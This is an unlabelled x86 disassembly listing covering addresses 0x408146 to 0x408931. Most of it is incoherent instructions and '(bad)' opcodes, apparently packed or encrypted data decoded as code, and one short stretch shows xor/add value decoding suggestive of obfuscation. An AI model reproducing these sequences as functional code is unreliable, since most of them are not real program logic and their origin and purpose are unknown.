  408146:	jecxz  0x408159
  408148:	and    eax,0x9b3a50c6
  40814d:	xchg   ecx,eax
  40814e:	sub    al,0x6f
  408150:	xor    al,0x4e
  408152:	paddsb mm6,mm2
  408155:	jmp    0x136f:0x6acc0b99
  40815c:	ja     0x4080e1
  40815e:	js     0x4080ee
  408160:	mov    eax,fs:0x2406a472
  408166:	mov    esi,0x7efdca8d
  40816b:	mov    dl,0xd
  40816d:	leave  
  40816e:	jp     0x40812c
  408170:	cdq    
  408171:	push   eax
  408172:	add    eax,0x9a73479
  408177:	or     ebp,edi
  408179:	or     ecx,esp
  40817b:	pop    esp
  40817c:	(bad)
  408180:	mov    ?,ebp
  408182:	or     al,0x7
  408184:	mov    ch,BYTE PTR [eax-0x55f30148]
  40818a:	xor    edi,DWORD PTR [eax]
  40818c:	add    esi,esi
  40818e:	lock sub eax,edx
  408191:	int3   
  408192:	and    al,0x89
  408194:	shl    DWORD PTR [esi],1
  408196:	dec    eax
  408197:	call   0x1f88:0x51eb874e
  40819e:	sahf   
  40819f:	jbe    0x4081a8
  4081a1:	push   ebp
  4081a2:	outs   dx,BYTE PTR ds:[esi]
  4081a3:	xor    bh,ah
  4081a5:	int3   
  4081a6:	or     eax,0x5b237a27
  4081ab:	aas    
  4081ac:	test   eax,0x2cf80224
  4081b1:	mov    ds:0x5eb265d2,eax
  4081b6:	and    ebp,DWORD PTR [eax+0x6c]
  4081b9:	inc    ebp
  4081ba:	cmc    
  4081bb:	push   ss
  4081bc:	mov    esp,0x13512c1c
  4081c1:	xlat   BYTE PTR ds:[ebx]
  4081c2:	adc    ecx,ebp
  4081c4:	repz fwait
  4081c6:	jle    0x408235
  4081c8:	mov    edi,0x84a0a40f
  4081cd:	pusha  
  4081ce:	sbb    al,0x8e
  4081d0:	push   0x8d599598
  4081d5:	inc    ebp
  4081d6:	add    al,0x89
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	call   0x37a2f50a
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x4082e2
  408275:	and    cl,BYTE PTR [ecx-0x1c19381]
  40827b:	mov    al,ds:0x3411b8cf
  408280:	popf   
  408281:	sub    ch,BYTE PTR [esi-0x5e306cbc]
  408287:	xchg   esp,eax
  408288:	fcmovne st,st(0)
  40828a:	push   edi
  40828b:	test   BYTE PTR [ecx],cl
  40828d:	(bad)  
  408290:	clc    
  408291:	in     al,dx
  408292:	inc    edi
  408293:	pusha  
  408294:	sbb    ebx,ecx
  408296:	mov    ebx,0x96d88291
  40829b:	popa   
  40829c:	pushf  
  40829d:	rcl    DWORD PTR [ebx],cl
  40829f:	pop    ss
  4082a0:	ret    
  4082a1:	pop    eax
  4082a2:	push   esp
  4082a3:	(bad)  
  4082a4:	bound  ebp,QWORD PTR [ebx-0x6]
  4082a7:	add    DWORD PTR [ebp+0x3f],0xfffffffb
  4082ab:	lea    edi,ss:[eax]
  4082ae:	xor    al,0xe7
  4082b0:	ret    0x5cc5
  4082b3:	pop    edi
  4082b4:	sti    
  4082b5:	sbb    ecx,DWORD PTR [eax+0x70]
  4082b8:	xlat   BYTE PTR ds:[ebx]
  4082b9:	call   FWORD PTR [edi+0x17]
  4082bc:	clc    
  4082bd:	cdq    
  4082be:	popa   
  4082bf:	fwait
  4082c0:	dec    BYTE PTR [edi+0x35f30dc2]
  4082c6:	pop    edi
  4082c7:	mov    BYTE PTR [ebp+ebp*1+0xf0aa4ed],bh
  4082ce:	xchg   edi,eax
  4082cf:	and    al,0xe4
  4082d1:	aas    
  4082d2:	push   ecx
  4082d3:	jmp    0x4082b0
  4082d5:	pop    esi
  4082d6:	loop   0x40827e
  4082d8:	adc    al,0x69
  4082da:	addr16 sbb ecx,esp
  4082dd:	(bad)  
  4082de:	mov    bl,0xfc
  4082e0:	adc    ebp,edx
  4082e2:	icebp  
  4082e3:	retf   0x4352
  4082e6:	adc    ebx,esp
  4082e8:	loopne 0x408273
  4082ea:	inc    ecx
  4082eb:	push   ebp
  4082ec:	test   DWORD PTR [eax-0x49325f34],edi
  4082f2:	(bad)  
  4082f3:	jns    0x408284
  4082f5:	shl    al,0x5b
  4082f8:	fild   QWORD PTR ds:0x7d62c09b
  4082fe:	lods   al,BYTE PTR ds:[esi]
  4082ff:	fcmovbe st,st(3)
  408301:	ins    BYTE PTR es:[edi],dx
  408302:	(bad)  
  408303:	imul   ecx
  408305:	cmp    BYTE PTR ds:0x85838dc8,bl
  40830b:	mov    dh,0x3b
  40830d:	dec    ebp
  40830e:	daa    
  40830f:	jle    0x408312
  408311:	adc    eax,0x29ce0cec
  408316:	adc    DWORD PTR [ebp-0x44],edx
  408319:	mov    esi,DWORD PTR [ecx+edx*4]
  40831c:	ret    0xa8b1
  40831f:	add    eax,0x8f7eca58
  408324:	or     eax,0xe3b85ba8
  408329:	or     cl,BYTE PTR [edi+0x29]
  40832c:	cmp    eax,0x617f1f04
  408331:	mov    dh,0x90
  408333:	add    al,0x69
  408335:	ins    BYTE PTR es:[edi],dx
  408336:	push   0x78
  408338:	lock or edi,ebp
  40833b:	mov    esi,DWORD PTR [esi-0x5628d424]
  408341:	mov    ebx,0x6d806e96
  408346:	in     al,0xce
  408348:	jae    0x408371
  40834a:	pop    esi
  40834b:	nop
  40834c:	or     al,0xeb
  40834e:	jmp    0xf46dad6d
  408353:	stc    
  408354:	neg    DWORD PTR [edx+eax*2]
  408357:	xchg   ebp,eax
  408358:	mov    eax,ds:0x8d2da2a1
  40835d:	and    esi,DWORD PTR [edi-0x57]
  408360:	stc    
  408361:	mov    eax,0x81cab45
  408366:	pop    es
  408367:	fs push ds
  408369:	cmp    al,0x94
  40836b:	push   ebp
  40836c:	ffreep st(4)
  40836e:	mov    ds:0x32e086af,eax
  408373:	cdq    
  408374:	ss sbb al,0x76
  408377:	mov    ch,0x43
  408379:	clc    
  40837a:	cmp    BYTE PTR [esi],bh
  40837c:	adc    edx,DWORD PTR [eax+eiz*2]
  40837f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408380:	hlt    
  408381:	nop
  408382:	mov    ss,WORD PTR [ebp-0x1b16d23a]
  408388:	aam    0x98
  40838a:	arpl   cx,si
  40838c:	or     DWORD PTR [esi+0x4b],esp
  40838f:	add    cl,ch
  408391:	or     BYTE PTR [edi+0x61fe6241],bl
  408397:	ja     0x4083db
  408399:	scas   al,BYTE PTR es:[edi]
  40839a:	jl     0x408404
  40839c:	xor    bh,dl
  40839e:	push   0x75
  4083a0:	dec    edx
  4083a1:	repnz into 
  4083a3:	aam    0xe3
  4083a5:	pop    eax
  4083a6:	xor    al,0x3
  4083a8:	sahf   
  4083a9:	call   DWORD PTR [edi-0x1c492277]
  4083af:	ins    BYTE PTR es:[edi],dx
  4083b0:	and    ecx,DWORD PTR [esi+0x3b135de9]
  4083b6:	out    0xb7,eax
  4083b8:	(bad)  
  4083b9:	aam    0x47
  4083bb:	aaa    
  4083bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083bd:	scas   eax,DWORD PTR es:[edi]
  4083be:	out    0x97,eax
  4083c0:	xchg   ebp,eax
  4083c1:	dec    eax
  4083c2:	xchg   DWORD PTR [ecx-0x11],eax
  4083c5:	hlt    
  4083c6:	mov    ds:0xf931f900,eax
  4083cb:	cli    
  4083cc:	xchg   DWORD PTR [edx+0x51],ebp
  4083cf:	(bad)  
  4083d0:	aad    0x59
  4083d2:	push   ebp
  4083d3:	aad    0xd6
  4083d5:	and    DWORD PTR [ebp+0x2e],0x9147b35b
  4083dc:	dec    edi
  4083dd:	inc    eax
  4083de:	gs xchg edx,eax
  4083e0:	cwde   
  4083e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083e3:	inc    ecx
  4083e4:	(bad)  
  4083e5:	xor    ecx,DWORD PTR [edx+ebx*1+0x4943f555]
  4083ec:	test   al,0x86
  4083ee:	pop    edi
  4083ef:	sub    DWORD PTR [eax+eiz*2],esi
  4083f2:	sar    DWORD PTR [esp+edx*2-0x27cc26dc],1
  4083f9:	sbb    al,0xf1
  4083fb:	ret    0xa84e
  4083fe:	pop    ds
  4083ff:	and    BYTE PTR fs:[edi-0x31],ch
  408403:	(bad)  
  408404:	sbb    dl,BYTE PTR [ecx+0x12]
  408407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408408:	mov    WORD PTR [edi-0x71ec5eee],gs
  40840e:	lods   eax,DWORD PTR ds:[esi]
  40840f:	dec    BYTE PTR [ebx+0x6110dbe]
  408415:	mov    eax,edi
  408417:	or     DWORD PTR [ecx+0x4dca9a16],esi
  40841d:	jnp    0x408445
  40841f:	cmc    
  408420:	xlat   BYTE PTR ds:[ebx]
  408421:	icebp  
  408422:	nop
  408423:	aad    0x33
  408425:	push   ss
  408426:	outs   dx,BYTE PTR ds:[esi]
  408427:	ret    0x70ac
  40842a:	mov    ch,0x4e
  40842c:	icebp  
  40842d:	lahf   
  40842e:	push   ss
  40842f:	push   edi
  408430:	jl     0x408427
  408432:	hlt    
  408433:	div    DWORD PTR ds:0x5c2659c1
  408439:	sub    esp,eax
  40843b:	sub    DWORD PTR [ecx],eax
  40843d:	frstor [ebp-0x498284a8]
  408443:	rol    DWORD PTR [esi],cl
  408445:	adc    al,0x5
  408447:	fisub  WORD PTR [ebx+0x4f]
  40844a:	mov    WORD PTR [esi-0x43],ds
  40844d:	ret    0x95f0
  408450:	pop    ebp
  408451:	lahf   
  408452:	adc    ebx,esi
  408454:	jnp    0x4083f0
  408456:	xchg   ebp,eax
  408457:	fwait
  408458:	(bad)  
  408459:	fdiv   QWORD PTR [eax-0x5360bf17]
  40845f:	push   esi
  408460:	or     al,0x2c
  408462:	rol    DWORD PTR [ecx+ebp*4],1
  408465:	mov    bl,0x69
  408467:	mov    ah,0xcf
  408469:	(bad)  
  40846a:	push   ebp
  40846b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40846d:	std    
  40846e:	int3   
  40846f:	fwait
  408470:	nop
  408471:	stos   BYTE PTR es:[edi],al
  408472:	rcl    DWORD PTR [ebx+0x486d4b2a],cl
  408478:	push   cs
  408479:	and    DWORD PTR [ecx+0x64a990c],esi
  40847f:	lahf   
  408480:	mov    edi,0xeb00fc26
  408485:	add    BYTE PTR [si-0x38],0x59
  40848a:	fsub   st,st(3)
  40848c:	ficomp DWORD PTR [edx+0xdf7b6d1]
  408492:	adc    ch,BYTE PTR [edx-0x28]
  408495:	push   edx
  408496:	add    BYTE PTR [ebp-0x7017bf3],0xd0
  40849d:	push   ebx
  40849e:	push   0xe9d5590e
  4084a3:	xor    al,BYTE PTR [eax]
  4084a5:	sub    eax,0xaaedf536
  4084aa:	in     eax,0xc5
  4084ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084ad:	cmc    
  4084ae:	jg     0x40844a
  4084b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084b1:	jnp    0x4084df
  4084b3:	ret    0x5d50
  4084b6:	mov    ds:0x40da0501,eax
  4084bb:	test   BYTE PTR [eax-0x10a37280],0x59
  4084c2:	sub    edx,0xb206dae9
  4084c8:	sub    DWORD PTR [ebp+0x6c],0x18a7b276
  4084cf:	fiadd  WORD PTR [esi]
  4084d1:	cdq    
  4084d2:	dec    esp
  4084d3:	or     DWORD PTR [eax-0x66],0x85473343
  4084da:	pushf  
  4084db:	dec    ebp
  4084dc:	xchg   ecx,eax
  4084dd:	je     0x40854c
  4084df:	iret   
  4084e0:	push   ebp
  4084e1:	mov    ebx,0x8b1b1a5a
  4084e6:	retf   
  4084e7:	jmp    0x887be94e
  4084ec:	mov    dh,0x78
  4084ee:	adc    ch,BYTE PTR [ebp-0x7367b0e7]
  4084f4:	jl     0x4084fe
  4084f6:	xchg   edx,eax
  4084f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084f8:	cmp    al,dh
  4084fa:	(bad)  
  4084fb:	pop    eax
  4084fc:	pushf  
  4084fd:	ret    0x8e32
  408500:	(bad)  
  408501:	(bad)
  408504:	xchg   ebp,eax
  408505:	in     al,0x3d
  408507:	ss jge 0x408495
  40850a:	repz xlat BYTE PTR ds:[ebx]
  40850c:	pop    ebp
  40850d:	pop    ss
  40850e:	mov    al,0xd7
  408510:	jno    0x4084dd
  408512:	lock retf 
  408514:	loopne 0x40850e
  408516:	jge    0x40857f
  408518:	push   esi
  408519:	daa    
  40851a:	sub    al,0x20
  40851c:	xchg   ebx,eax
  40851d:	xlat   BYTE PTR ds:[ebx]
  40851e:	inc    edx
  40851f:	ja     0x40853e
  408521:	sbb    bh,ch
  408523:	repz (bad) 
  408525:	loopne 0x4084aa
  408527:	mov    ch,BYTE PTR [edx]
  408529:	sti    
  40852a:	icebp  
  40852b:	stos   DWORD PTR es:[edi],eax
  40852c:	mov    ds:0x323ecf4b,al
  408531:	test   DWORD PTR [ebp-0x71],eax
  408534:	sahf   
  408535:	retf   0x1ecf
  408538:	push   eax
  408539:	push   edi
  40853a:	shr    BYTE PTR [esi],1
  40853c:	pminub mm6,QWORD PTR [ebx-0x22]
  408540:	adc    BYTE PTR [esi+0x6e7618aa],ah
  408546:	sub    al,0x10
  408548:	or     BYTE PTR [edi],bh
  40854a:	jmp    0xce03:0xbfe5cfb9
  408551:	mov    ds:0xbdb95a98,al
  408556:	fistp  WORD PTR ds:0x2a2b4824
  40855c:	std    
  40855d:	out    dx,al
  40855e:	or     al,0xa5
  408560:	mov    al,0xe5
  408562:	xchg   edi,eax
  408563:	jo     0x408589
  408565:	aas    
  408566:	sub    dh,BYTE PTR [esi]
  408568:	rcr    BYTE PTR [ebx],1
  40856a:	test   BYTE PTR [ebx+0x158d1d18],bh
  408570:	push   ecx
  408571:	push   esi
  408572:	mov    dl,0x7c
  408574:	jecxz  0x40851d
  408576:	or     eax,0x54511e27
  40857b:	mov    al,0x8d
  40857d:	adc    esp,ebx
  40857f:	icebp  
  408580:	sahf   
  408581:	mov    bl,0xbc
  408583:	mov    esi,0x1a035b16
  408588:	dec    ebx
  408589:	aad    0x7f
  40858b:	(bad)  
  40858c:	repnz out 0x2c,eax
  40858f:	call   DWORD PTR [eax]
  408591:	(bad)  
  408592:	jno    0x40853a
  408594:	mov    bh,0xf1
  408596:	cmp    eax,0x9dfd48ac
  40859b:	mov    ds:0x9089bd84,eax
  4085a0:	(bad)  
  4085a1:	xor    eax,0x188bc22
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x875356ec
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x408556
  4085c4:	fcmove st,st(3)
  4085c6:	inc    esi
  4085c7:	out    dx,eax
  4085c8:	pop    ss
  4085c9:	inc    edi
  4085ca:	int    0x28
  4085cc:	test   DWORD PTR [eiz*2+0xab70ca4],esp
  4085d3:	nop
  4085d4:	xchg   edx,eax
  4085d5:	pushf  
  4085d6:	sbb    eax,0x3f23599b
  4085db:	push   ebx
  4085dc:	push   eax
  4085dd:	cli    
  4085de:	cmp    al,0x4b
  4085e0:	add    al,0xc
  4085e2:	sub    BYTE PTR [ebx+0x7479b8d],ah
  4085e8:	jg     0x4085ba
  4085ea:	xchg   edi,eax
  4085eb:	mov    ebx,0xd1184180
  4085f0:	jno    0x408638
  4085f2:	aad    0x46
  4085f4:	fsub   DWORD PTR [ebx-0xa]
  4085f7:	dec    esi
  4085f8:	into   
  4085f9:	fmul   QWORD PTR [ecx-0x290a7be6]
  4085ff:	test   DWORD PTR [ecx+ebp*8+0x58],ebx
  408603:	int3   
  408604:	dec    ecx
  408605:	dec    ebx
  408606:	outs   dx,BYTE PTR ds:[esi]
  408607:	test   eax,0xf1cb90c5
  40860c:	dec    ebp
  40860d:	add    DWORD PTR [ebx-0x31],edx
  408610:	push   edi
  408611:	or     eax,0x66da578a
  408616:	mov    cs,WORD PTR [edx+0x1eaf73d9]
  40861c:	std    
  40861d:	sbb    eax,0x1bc328d0
  408622:	jle    0x40869c
  408624:	and    BYTE PTR [ebx+0x66802835],cl
  40862a:	push   0x5c1abecc
  40862f:	dec    eax
  408630:	aas    
  408631:	sar    BYTE PTR [ebx],cl
  408633:	mul    DWORD PTR [esi-0x49e4117c]
  408639:	adc    eax,0xa0696f33
  40863e:	xchg   edx,eax
  40863f:	mov    ebx,0xd976cc57
  408644:	nop
  408645:	inc    ebp
  408646:	push   ss
  408647:	jl     0x4086b3
  408649:	ins    BYTE PTR es:[edi],dx
  40864a:	push   cs
  40864b:	stc    
  40864c:	sahf   
  40864d:	mov    al,ds:0xd2433365
  408652:	mov    bh,0xc8
  408654:	push   edx
  408655:	add    DWORD PTR [ebp+0x57],ebx
  408658:	xchg   esp,eax
  408659:	lea    esp,[eax]
  40865b:	xor    BYTE PTR [ecx],bl
  40865d:	(bad)
  408660:	dec    edx
  408661:	ins    DWORD PTR es:[edi],dx
  408662:	int3   
  408663:	adc    BYTE PTR [eax+0x2b],ch
  408666:	cli    
  408667:	and    ah,dh
  408669:	stc    
  40866a:	imul   esi,eax,0xffffffb1
  40866d:	cmp    BYTE PTR [esi-0x18aed1cb],0x6b
  408674:	push   esi
  408675:	fild   WORD PTR [eax]
  408677:	(bad)
  40867a:	popf   
  40867b:	add    bl,ah
  40867d:	mov    bl,0x34
  40867f:	inc    edi
  408680:	(bad)  
  408681:	es gs adc al,0x82
  408685:	cmp    BYTE PTR [ebp-0x55cc3e32],cl
  40868b:	daa    
  40868c:	jecxz  0x4086eb
  40868e:	(bad)  
  40868f:	std    
  408690:	cmp    al,0xcd
  408692:	dec    eax
  408693:	icebp  
  408694:	mov    al,ds:0x981221ac
  408699:	and    esp,edx
  40869b:	icebp  
  40869c:	mov    BYTE PTR [edx+0x647b0496],ch
  4086a2:	mov    ecx,0x2b71aa5d
  4086a7:	xchg   BYTE PTR [ebx+ebx*8+0x14b5567b],dh
  4086ae:	addr16 sub edi,ecx
  4086b1:	add    eax,0x1c2c9336
  4086b6:	outs   dx,BYTE PTR ds:[esi]
  4086b7:	sub    ah,BYTE PTR [ebx-0x5]
  4086ba:	shl    eax,cl
  4086bc:	xchg   ecx,ebp
  4086be:	in     al,dx
  4086bf:	pushf  
  4086c0:	aas    
  4086c1:	xlat   BYTE PTR ds:[ebx]
  4086c2:	adc    eax,eax
  4086c4:	popa   
  4086c5:	push   eax
  4086c6:	or     eax,0x16ffbbec
  4086cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086cc:	(bad)  
  4086cd:	pop    esi
  4086ce:	iret   
  4086cf:	mov    eax,ds:0x901b26be
  4086d4:	inc    BYTE PTR [eax-0x3221781a]
  4086da:	mov    bl,0x66
  4086dc:	sahf   
  4086dd:	mov    cl,0xda
  4086df:	inc    ebx
  4086e0:	cdq    
  4086e1:	inc    edi
  4086e2:	std    
  4086e3:	in     al,dx
  4086e4:	pop    ds
  4086e5:	ins    BYTE PTR es:[edi],dx
  4086e6:	ja     0x40874a
  4086e8:	inc    edi
  4086e9:	ss adc eax,0x3c9290a9
  4086ef:	xacquire xchg DWORD PTR [ebx+0x32776c7e],esi
  4086f6:	gs aas 
  4086f8:	in     eax,0x1d
  4086fa:	das    
  4086fb:	(bad)  
  4086fc:	xchg   esi,eax
  4086fd:	pop    ebp
  4086fe:	adc    dl,BYTE PTR [edi+edi*1+0x7b]
  408702:	lea    ebx,[ebp-0x33]
  408705:	push   ds
  408706:	inc    edi
  408707:	xor    dl,ah
  408709:	dec    eax
  40870a:	sbb    bh,ch
  40870c:	inc    ebp
  40870d:	push   0x6f
  40870f:	repz mov edi,0x19b626e7
  408715:	sub    BYTE PTR [edx-0x749591c],dh
  40871b:	jo     0x4086c6
  40871d:	das    
  40871e:	cwde   
  40871f:	jno    0x408781
  408721:	mov    eax,0xea1d192a
  408726:	or     cl,0x1c
  408729:	cmp    BYTE PTR [edx+0x37],dl
  40872c:	imul   eax,esi,0x62
  40872f:	dec    ebp
  408730:	aad    0xe
  408732:	xchg   ebp,eax
  408733:	jbe    0x408715
  408735:	aas    
  408736:	mov    cs,WORD PTR ds:0xb2eb874e
  40873c:	sbb    bh,ch
  40873e:	pop    ecx
  40873f:	js     0x40878a
  408741:	ret    0x203
  408744:	mov    esi,0x8ce29177
  408749:	scas   eax,DWORD PTR es:[edi]
  40874a:	into   
  40874b:	push   es
  40874c:	call   FWORD PTR [ecx+0x4a]
  40874f:	mov    ds:0x6ce0871e,al
  408754:	jge    0x408762
  408756:	lea    ebp,[edi+0x46]
  408759:	imul   edx,ebp,0x77
  40875c:	xchg   esi,eax
  40875d:	xor    BYTE PTR [edx],0x73
  408760:	mov    eax,DWORD PTR [edx+0x691ada7b]
  408766:	shl    BYTE PTR [ebp+0x77],0xc4
  40876a:	push   es
  40876b:	and    cl,0x6c
  40876e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40876f:	and    ecx,DWORD PTR [edx]
  408771:	dec    eax
  408772:	or     eax,0xf8da71d8
  408777:	adc    eax,0x99f79d9f
  40877c:	das    
  40877d:	pop    edi
  40877e:	imul   eax,DWORD PTR ds:0x5f5a3449,0x41a4a306
  408788:	aam    0xae
  40878a:	dec    esp
  40878b:	jns    0x408782
  40878d:	and    BYTE PTR [eax+0x3c9484ca],0x7f
  408794:	mov    edx,0x406cc4cb
  408799:	fsubr  st,st(6)
  40879b:	aas    
  40879c:	xchg   BYTE PTR ds:0x3a6d0f46,bh
  4087a2:	pop    ecx
  4087a3:	mov    ?,WORD PTR [ebx-0x3db12e44]
  4087a9:	es cmc 
  4087ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087ac:	dec    esp
  4087ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087ae:	inc    edx
  4087af:	xchg   edx,eax
  4087b0:	ins    DWORD PTR es:[edi],dx
  4087b1:	xchg   esp,eax
  4087b2:	je     0x4087c7
  4087b4:	retf   
  4087b5:	inc    ecx
  4087b6:	in     eax,dx
  4087b7:	je     0x408805
  4087b9:	and    bh,bl
  4087bb:	repz mul DWORD PTR [edx+0x24240cc9]
  4087c2:	in     al,0x7b
  4087c4:	xchg   edx,eax
  4087c5:	sahf   
  4087c6:	sbb    al,0x13
  4087c8:	sub    eax,0x90c7dae4
  4087cd:	pop    esp
  4087ce:	and    al,bh
  4087d0:	sbb    eax,0x79c0701b
  4087d5:	xchg   ecx,eax
  4087d6:	dec    ebp
  4087d7:	fldenv [eax-0x2a]
  4087da:	test   DWORD PTR [edx+eiz*4],eax
  4087dd:	cwde   
  4087de:	sahf   
  4087df:	loopne 0x408779
  4087e1:	mov    edi,0x70663457
  4087e6:	test   BYTE PTR [edx+0x62],dh
  4087e9:	inc    ecx
  4087ea:	mov    dl,ch
  4087ec:	inc    esi
  4087ed:	mov    esi,cr6
  4087f0:	add    BYTE PTR [esi-0x51cf7e97],0x77
  4087f7:	sub    DWORD PTR [esi],esp
  4087f9:	loopne 0x408808
  4087fb:	jmp    0x408872
  4087fd:	jl     0x4087d4
  4087ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408800:	xchg   BYTE PTR [eax],cl
  408802:	sbb    dh,bl
  408804:	(bad)  
  408806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408807:	fisttp QWORD PTR [edx]
  408809:	jp     0x408804
  40880b:	pop    edi
  40880c:	stc    
  40880d:	ss retf 
  40880f:	mov    edi,0x9ff44e49
  408814:	push   ebp
  408815:	sub    DWORD PTR [esi-0x69],0xffffffab
  408819:	(bad)  
  40881a:	addr16 sahf 
  40881c:	push   es
  40881d:	call   0x6a5c155a
  408822:	and    eax,0x17d6d071
  408827:	ja     0x40881f
  408829:	bound  edi,QWORD PTR [ebp-0x26c8a9eb]
  40882f:	adc    DWORD PTR [ebx+0x4d],ecx
  408832:	and    cl,BYTE PTR [edi-0x33a7f76e]
  408838:	ror    BYTE PTR [edi+0xbb5b477],cl
  40883e:	or     bh,BYTE PTR [esi+0x67]
  408841:	sub    eax,0x5b991770
  408846:	mov    esi,0x54b8b8dd
  40884b:	fdivr  QWORD PTR ds:0x5631c9bc
  408851:	jbe    0x408813
  408853:	(bad)  
  408854:	push   ebx
  408855:	push   esp
  408856:	add    BYTE PTR fs:[eax],ah
  408859:	fadd   DWORD PTR [edi-0x47]
  40885c:	clc    
  40885d:	adc    ebx,DWORD PTR [esi-0xe]
  408860:	xchg   ecx,eax
  408861:	icebp  
  408862:	and    DWORD PTR [ebx-0x5e],ecx
  408865:	gs adc eax,0x40dcc0b2
  40886b:	daa    
  40886c:	and    BYTE PTR [esi-0x3b],dl
  40886f:	outs   dx,BYTE PTR ds:[esi]
  408870:	out    dx,eax
  408871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408872:	daa    
  408873:	mov    cs:0xbb3b8ffd,eax
  408879:	out    dx,eax
  40887a:	repz dec esp
  40887c:	dec    ebp
  40887d:	pop    ecx
  40887e:	pop    DWORD PTR [ebx-0x39]
  408881:	in     al,0x70
  408883:	jmp    0x4088b4
  408885:	sahf   
  408886:	cmc    
  408887:	lods   eax,DWORD PTR ds:[esi]
  408888:	xor    eax,DWORD PTR [ebx+0x63]
  40888b:	stc    
  40888c:	sub    BYTE PTR [eax-0x19],0xca
  408890:	ss pop edx
  408892:	jmp    0x40881d
  408894:	pop    ebp
  408895:	xchg   DWORD PTR [ecx+0x76],ebx
  408898:	jno    0x408827
  40889a:	stos   DWORD PTR es:[edi],eax
  40889b:	int    0xdc
  40889d:	mov    ebp,0xdc0194f7
  4088a3:	pop    ecx
  4088a4:	push   es
  4088a5:	int3   
  4088a6:	adc    al,bl
  4088a8:	add    bl,dl
  4088aa:	jno    0x408834
  4088ac:	add    BYTE PTR [ecx+0x505abf7d],cl
  4088b2:	lock jb 0x408922
  4088b5:	adc    eax,DWORD PTR [edx+0x24b5483b]
  4088bb:	leave  
  4088bc:	out    0xcd,eax
  4088be:	mov    ds:0x22a7dd40,eax
  4088c3:	xchg   esp,eax
  4088c4:	mov    ebp,0x6ffedb14
  4088c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088ca:	ror    DWORD PTR [eax-0x4f1e92ce],0x13
  4088d1:	sub    DWORD PTR [ecx],0x58
  4088d4:	int    0x6
  4088d6:	and    esi,edi
  4088d8:	daa    
  4088d9:	imul   ebx,DWORD PTR [esi+0x78ae7d47],0x3ec04c31
  4088e3:	xlat   BYTE PTR ds:[ebx]
  4088e4:	jnp    0x408944
  4088e6:	icebp  
  4088e7:	pusha  
  4088e8:	or     ebp,DWORD PTR [ebx+ebp*1-0x71e63283]
  4088ef:	pop    ebp
  4088f0:	pop    esi
  4088f1:	ror    DWORD PTR [ebp-0x107ba73],1
  4088f7:	add    BYTE PTR [eax+0x50],al
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x23435cff],cl
  40890c:	out    0x7d,al
  40890e:	and    BYTE PTR [edi+0x207070dc],dl
  408914:	jge    0x408986
  408916:	jo     0x40895e
  408918:	out    dx,al
  408919:	cmp    eax,0x42cba9b0
  40891e:	in     eax,0xc8
  408920:	test   al,0xb2
  408922:	ja     0x4088b1
  408924:	inc    ecx
  408925:	aad    0xd4
  408927:	dec    edx
  408928:	fimul  WORD PTR gs:[eax-0x1d]
  40892c:	mov    edx,0x14ed6659
  408931:	mov    bh,0x6c
